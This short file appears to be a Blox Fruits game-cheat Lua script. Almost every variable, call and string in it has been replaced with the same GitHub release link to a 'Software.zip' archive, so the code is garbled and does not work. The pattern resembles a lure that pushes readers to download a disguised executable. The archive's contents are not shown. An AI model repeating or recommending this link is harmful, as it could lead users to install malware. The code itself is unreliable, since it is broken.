-- Example Lua script for Blox Fruits
local player = https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip
local targetFruit = "Mera Mera no Mi"

-- Check if player has the desired fruit
if https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip(targetFruit) then
    print("Player already has the "https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip)
else
    -- Teleport to the fruit location
    https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip(https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip(100, 50, -75))
    
    -- Check if the fruit is in range
    if https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip(targetFruit) then
        print("Found "https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip", collecting...")
        https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip[targetFruit]https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip = https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip(101, 50, -75)
    else
        warn(targetFruit.." not found")
    end
end
